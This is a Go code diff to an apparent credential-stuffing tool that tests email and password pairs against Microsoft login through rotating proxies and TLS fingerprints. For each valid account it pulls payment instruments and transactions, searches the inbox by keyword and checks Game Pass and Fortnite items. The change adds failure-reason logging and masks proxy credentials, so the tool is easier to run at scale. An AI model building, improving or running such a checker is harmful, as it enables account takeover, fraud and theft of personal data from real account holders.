@@ -6,6 +6,7 @@ import (
 	http "github.com/bogdanfinn/fhttp"
 	"io"
 	"net/url"
+	"regexp"
 	"strings"
 	"time"
 
@@ -21,6 +22,20 @@ import (
 // Microsoft login, payment instruments + transactions, keyword inbox search,
 // Game Pass promos, Fortnite locker and account-type classification.
 // Returns: formattedHit, isValid, logMsg, shouldRetry.
+//
+// Every soft (retryable) failure carries a reason in logMsg so the activity
+// log can say WHY a line keeps failing (dead proxy, block, rate limit)
+// instead of silently retrying into an unexplained "attempts exhausted".
+
+// reCredInText matches scheme://user:pass@ inside error strings.
+var reCredInText = regexp.MustCompile(`(?i)([a-z][a-z0-9+.\-]*://)[^/@\s]+@`)
+
+// softReason formats a retryable network failure for the log. Proxied
+// request errors can embed the full proxy URL — credentials are masked so
+// they can never leak into the activity stream.
+func softReason(stage string, err error) string {
+	return stage + " failed: " + reCredInText.ReplaceAllString(err.Error(), "$1***@")
+}
 func ExecuteAccountValidation(email, password, proxyStr string, proxies []string, keywords []string, wfp *nettls.FP, cfg checkercfg.Config) (string, bool, string, bool) {
 	if wfp == nil {
 		wfp = nettls.NewWorkerFP(0)
@@ -28,7 +43,7 @@ func ExecuteAccountValidation(email, password, proxyStr string, proxies []string
 	preset := wfp.NextPreset()
 	client, oauthClient := nettls.NewPairProfile(proxyStr, 5*time.Second, 5*time.Second, preset.Profile)
 	if client == nil {
-		return "", false, "", true
+		return "", false, "proxy setup failed — could not create the HTTP client", true
 	}
 	ua := preset.UA
 	profile := preset.Profile
@@ -41,14 +56,18 @@ func ExecuteAccountValidation(email, password, proxyStr string, proxies []string
 
 	respInit, err := nettls.Do(client, reqInit)
 	if err != nil {
-		return "", false, "", true // network / preflight – retry
+		return "", false, softReason("preflight", err), true // network / proxy – retry
 	}
 	bodyInitBytes, _ := io.ReadAll(respInit.Body)
 	respInit.Body.Close()
 	ppft := nettls.ExtractPPFT(string(bodyInitBytes))
 
 	if ppft == "" {
-		return "", false, "", true // PPFT fail – retry
+		// No PPFT means login.live.com served something other than the login
+		// form — an IP/proxy block, a rate limit, or a changed page.
+		return "", false, fmt.Sprintf(
+			"preflight returned no PPFT (status %d, %d bytes) — proxy flagged or rate-limited",
+			respInit.StatusCode, len(bodyInitBytes)), true
 	}
 
 	loginData := url.Values{}
@@ -74,7 +93,7 @@ func ExecuteAccountValidation(email, password, proxyStr string, proxies []string
 
 	respPost, err := nettls.Do(client, reqPost)
 	if err != nil {
-		return "", false, "", true // POST network – retry
+		return "", false, softReason("login", err), true // POST network – retry
 	}
 	defer respPost.Body.Close()
 	bodyBytes, _ := io.ReadAll(respPost.Body)
@@ -87,8 +106,10 @@ func ExecuteAccountValidation(email, password, proxyStr string, proxies []string
 	}
 
 	if strings.Contains(bodyStr, "Sign in to your Microsoft account") && strings.Contains(bodyStr, "proof") {
-		// Extra proof / challenge – discard, do not retry
-		return "", false, "", false
+		// Extra proof / challenge – discard, do not retry. Previously this
+		// vanished silently (no log line at all), which made runs look like
+		// they were dropping accounts for no reason.
+		return "", false, fmt.Sprintf("[%s] SKIP: Microsoft demanded extra verification.", email), false
 	}
 
 	reqAuth, err := http.NewRequest("GET", OAuthAuthorizeURL, nil)
@@ -99,14 +120,14 @@ func ExecuteAccountValidation(email, password, proxyStr string, proxies []string
 	if oauthClient == nil {
 		oauthClient = nettls.NewClientProfile(proxyStr, 5*time.Second, false, profile)
 		if oauthClient == nil {
-			return "", false, "", true
+			return "", false, "proxy setup failed — could not create the OAuth client", true
 		}
 		oauthClient.SetCookieJar(client.GetCookieJar())
 	}
 
 	respAuth, err := nettls.Do(oauthClient, reqAuth)
 	if err != nil {
-		return "", false, "", true // OAuth network – retry
+		return "", false, softReason("oauth", err), true // OAuth network – retry
 	}
 	defer respAuth.Body.Close()
 
@@ -115,7 +136,7 @@ func ExecuteAccountValidation(email, password, proxyStr string, proxies []string
 
 	if atk == "" {
 		// Soft – try the next proxy (capped to one pass through the list)
-		return "", false, "", true
+		return "", false, "sign-in returned no access token (rejected or rate-limited)", true
 	}
 
 	// Fetch Payment Instruments & Transactions
